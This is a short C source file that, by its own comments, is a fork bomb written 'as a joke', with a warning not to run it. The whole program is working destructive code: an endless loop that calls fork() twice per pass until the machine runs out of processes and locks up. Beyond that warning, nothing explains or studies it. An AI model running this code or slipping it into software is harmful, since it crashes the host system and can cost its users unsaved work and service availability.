#include <stdio.h>
#include <sys/types.h>
//basic fork bomb I DO NOT RECOMMEND RUNNING IT MADE IT AS A JOKE LOL
// I personally wanted to see what would happen lol :)
int main(){
    while(1){
        fork();
        fork();
    }
    return 0;
}